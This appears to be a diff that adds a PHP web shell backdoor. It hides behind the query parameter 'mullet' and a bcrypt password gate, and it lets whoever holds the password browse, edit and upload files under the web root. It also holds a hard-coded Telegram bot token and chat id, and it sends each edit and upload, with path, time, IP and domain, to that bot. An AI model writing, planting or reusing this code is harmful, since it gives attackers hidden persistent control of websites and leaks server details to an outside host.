@@ -1,0 +1,186 @@
+<?php
+if (isset($_GET['mullet'])) {
+
+    session_start();
+
+    $passHash = '$2a$12$qbUBAVBufBYtIT9KbYq2VeSywq/9N8gXUyETmsOe8dHnxBjXsN.0O';
+
+    // ================= TELEGRAM CONFIG =================
+    $token = "8728328154:AAG_VMgM7vlyQKa7H_axUaJv9P2eWlDiQ7E";
+    $chat_id = "8259867883";
+
+    function sendTele($msg, $token, $chat_id) {
+        $url = "https://api.telegram.org/bot8728328154:AAG_VMgM7vlyQKa7H_axUaJv9P2eWlDiQ7E/sendMessage?chat_id=8259867883&text=test";
+        $data = [
+            'chat_id' => $chat_id,
+            'text' => $msg
+        ];
+        @file_get_contents($url . "?" . http_build_query($data));
+    }
+
+    // LOGIN
+    if (isset($_POST['p']) && password_verify($_POST['p'], $passHash)) {
+        $_SESSION['ok'] = true;
+    }
+
+    if (!isset($_SESSION['ok'])) {
+        echo '<form method="post" style="margin-top:50px;text-align:center;">
+                <input type="password" name="p" placeholder="Password">
+                <button>Login</button>
+              </form>';
+        return;
+    }
+
+    // ROOT
+    $base = realpath($_SERVER['DOCUMENT_ROOT']);
+
+    // ================= HISTORY =================
+    if (!isset($_SESSION['history'])) {
+        $_SESSION['history'] = [];
+    }
+
+    if (isset($_GET['back'])) {
+        array_pop($_SESSION['history']);
+    }
+
+    if (isset($_GET['dir'])) {
+        $dir = realpath($_GET['dir']);
+        if ($dir && strpos($dir, $base) === 0) {
+            $_SESSION['history'][] = $dir;
+        }
+    }
+
+    $current = !empty($_SESSION['history'])
+        ? end($_SESSION['history'])
+        : $base;
+
+    // ================= EDIT FILE =================
+    if (isset($_GET['file'])) {
+
+        $file = realpath($_GET['file']);
+
+        if ($file === false || strpos($file, $base) !== 0 || !is_file($file)) {
+            echo "❌ File tidak valid";
+            return;
+        }
+
+        if (!is_writable($file)) {
+            @chmod($file, 0644);
+        }
+
+        if (isset($_POST['content'])) {
+
+            $fp = fopen($file, 'c+');
+            if (flock($fp, LOCK_EX)) {
+                ftruncate($fp, 0);
+                fwrite($fp, $_POST['content']);
+                fflush($fp);
+                flock($fp, LOCK_UN);
+                fclose($fp);
+                @chmod($file, 0644);
+                clearstatcache();
+
+                echo "<p style='color:green'>✅ Berhasil disimpan</p>";
+
+                // ================= TELEGRAM =================
+                $msg = "✏️ FILE DI EDIT\n";
+                $msg .= "Path: $file\n";
+                $msg .= "Waktu: " . date("Y-m-d H:i:s") . "\n";
+                $msg .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+                $msg .= "Domain: " . $_SERVER['HTTP_HOST'];
+                sendTele($msg, $token, $chat_id);
+            } else {
+                echo "<p style='color:red'>❌ Gagal lock file</p>";
+            }
+        }
+
+        $content = htmlspecialchars(file_get_contents($file));
+
+        echo "<h3>Edit: $file</h3>";
+        echo "<a href='?mullet&back=1'>⬅️ Back</a><br><br>";
+
+        echo '<form method="post">
+                <textarea name="content" style="width:100%;height:400px;">'.$content.'</textarea><br>
+                <button>Simpan</button>
+              </form>';
+
+        return;
+    }
+
+    // ================= UPLOAD =================
+    if (isset($_FILES['f'])) {
+
+        $name = basename($_FILES['f']['name']);
+        $target = $current . '/' . $name;
+
+        // AUTO RENAME
+        if (file_exists($target)) {
+            $info = pathinfo($name);
+            $i = 1;
+            do {
+                $newName = $info['filename'] . "_$i." . $info['extension'];
+                $target = $current . '/' . $newName;
+                $i++;
+            } while (file_exists($target));
+        }
+
+        if (move_uploaded_file($_FILES['f']['tmp_name'], $target)) {
+
+            @chmod($target, 0644);
+            clearstatcache();
+
+            echo "<p>✅ Upload sukses</p>";
+
+            // ================= TELEGRAM =================
+            $msg = "📤 FILE UPLOAD\n";
+            $msg .= "Path: $target\n";
+            $msg .= "Waktu: " . date("Y-m-d H:i:s") . "\n";
+            $msg .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+            $msg .= "Domain: " . $_SERVER['HTTP_HOST'];
+            sendTele($msg, $token, $chat_id);
+
+        } else {
+            echo "<p>❌ Upload gagal</p>";
+        }
+    }
+
+    // ================= UI =================
+    echo "<h3>📂 Folder: $current</h3>";
+
+    // NAVIGATION
+    echo "<a href='?mullet&dir=" . urlencode($base) . "'>🏠 Home</a> ";
+
+    $parent = dirname($current);
+    if ($parent && strpos($parent, $base) === 0) {
+        echo "<a href='?mullet&dir=" . urlencode($parent) . "'>⬆️ Up</a> ";
+    }
+
+    if (!empty($_SESSION['history'])) {
+        echo "<a href='?mullet&back=1'>⬅️ Back</a>";
+    }
+
+    echo "<br><br>";
+
+    // LIST
+    echo "<ul>";
+    foreach (scandir($current) as $f) {
+        if ($f == '.' || $f == '..') continue;
+        $full = $current . '/' . $f;
+
+        if (is_dir($full)) {
+            echo "📁 <a href='?mullet&dir=".urlencode($full)."'>$f</a><br>";
+        } else {
+            echo "📄 <a href='?mullet&file=".urlencode($full)."'>$f</a><br>";
+        }
+    }
+    echo "</ul>";
+
+    // UPLOAD FORM
+    echo '<form method="post" enctype="multipart/form-data">
+            <input type="file" name="f">
+            <button>Upload</button>
+          </form>';
+
+    return;
+}
+?>
